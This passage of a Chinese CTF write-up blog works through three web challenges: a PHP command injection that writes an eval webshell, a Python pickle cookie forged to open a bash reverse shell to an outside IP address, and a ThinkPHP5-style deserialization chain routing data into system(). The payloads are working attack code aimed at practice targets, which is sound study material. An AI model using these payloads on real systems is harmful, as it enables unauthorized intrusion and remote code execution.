src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681053041620-64d88e3b-82bf-4413-a4ba-0f528988ad56.png#averageHue=%230b0909&clientId=u41d96f62-3e19-4&from=paste&height=94&id=u8195393d&name=image.png&originHeight=117&originWidth=561&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12674&status=done&style=none&taskId=u837eb655-f9ef-4d91-bedc-84e0ba056f4&title=&width=448.8" alt="image.png"><br>但是可以看到GWHT和root用户都有权限读取，然后结合前面的passwd，可以猜测是使用su指令切换用户读取，这里涉及到一个tips，就是webshell如何交互式输入passwd呢？这里我想到的是弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681053090662-14580cf1-7667-4149-b6b3-a4bcfce0177f.png#averageHue=%23050403&clientId=u41d96f62-3e19-4&from=paste&height=223&id=u18f1528c&name=image.png&originHeight=279&originWidth=658&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14063&status=done&style=none&taskId=u600a2738-ce2c-4546-9165-716e2940109&title=&width=526.4" alt="image.png"><br>结果证明可行</p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>傻逼BUU靶场，我都不敢扫，诶也没办法，robots.txt有东西<br><code>Disallow: /?file=check.php</code><br>然后用filter协议可以读取源码，这里设计一个tips，就是双重url编码可以绕过filter的黑名单检测，刚刚卡在这儿了<br><code>/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;style&gt;</span><br><span class="line"> </span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>同样读取check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>然后改cookie的pass为GWHT<br>然后就可以执行exec指令，这里可以闭合语句达到写shell<br><code>file=GWHT.php&amp;count=&#39;|echo+&quot;&lt;?=+eval(\$_POST[&#39;shell&#39;])?&gt;&quot;+&gt;+a.php&#39;</code><br>然后就是上述流程了。<br>然后发现他们是用<code>printf &quot;GWHTCTF&quot; | su - GWHT -c &#39;cat /GWHT/system/of/a/down/flag.txt&#39;</code>直接执行。。。<br>贫穷限制了我的想象力</p>
<h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>考点：pickle反序列化<br>挺迷惑的，看到是购买选项，以为要伪造JWT<br>但是看到了<code>gAN9cQAoWAUAAABtb25leXEBTYYBWAcAAABoaXN0b3J5cQJdcQMoWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBFgUAAAAWXVtbXkgc23DtnJnw6VzZ3Vya2FxBWVYEAAAAGFudGlfdGFtcGVyX2htYWNxBlggAAAAYWZjNWVjYjU5OWEyMjJhN2ZjYmNmNTQzZjI1MzY4Y2VxB3Uu</code><br>这样的敏感cookie，简单的解密后是这样子<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681054535855-6c2438bc-beca-4adc-9564-1a791e2b0fae.png#averageHue=%233c4042&clientId=uc8927163-ac75-4&from=paste&height=161&id=ua62fac46&name=image.png&originHeight=201&originWidth=1330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21264&status=done&style=none&taskId=u959122e2-4dba-4507-bc0a-7970c1c9924&title=&width=1064" alt="image.png"><br>这个让我想起了pickle的格式，我就试着去解密了一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681054566440-c8aaa3aa-c056-48b3-8e15-e27ff39929db.png#averageHue=%23232428&clientId=uc8927163-ac75-4&from=paste&height=582&id=uecb547ac&name=image.png&originHeight=728&originWidth=1875&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152313&status=done&style=none&taskId=u7dd7092f-ea9b-4500-8809-bda46936443&title=&width=1500" alt="image.png"><br>正好是pickle，随后就直接来了一手反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">newp=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(newp))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681054601360-3d5549cf-f3c9-426d-8a30-ebf5f0cf48ac.png#averageHue=%23131211&clientId=uc8927163-ac75-4&from=paste&height=205&id=u86d16ae2&name=image.png&originHeight=256&originWidth=902&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15705&status=done&style=none&taskId=u27b2ba63-3fb9-4867-bdf4-d75f0b0dd15&title=&width=721.6" alt="image.png"></p>
<h1 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h1><p>考点：TP5反序列化写shell模型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cache_filename</span>, -<span class="title function_ invoke__">strlen</span>(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getExpireTime</span>(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>这一题就是那个TP5反序列化写shell的模型，代码都没怎么变，具体可以参考<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/ag52fdyg012qu1p0?view=doc_embed">ThinkPHP5.x反序列化漏洞全复现</a><br>然后赵总写的挺清楚的<br><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6397.html">https://www.zhaoj.in/read-6397.html</a><br>放个预期解</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$testB</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$testB</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="variable">$testB</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$testB</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$testB</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="string">&quot;aaa\n&quot;</span>;</span><br><span class="line"><span class="variable">$testB</span>-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$testA</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$testB</span>, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line"><span class="variable">$testA</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$testA</span>-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.php`&#x27;</span>];</span><br><span class="line"><span class="variable">$testA</span>-&gt;complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$testA</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>非预期反而是上面说的thinkphp，感觉还行，由于最近吃了太多答辩不想调试着玩了</p>
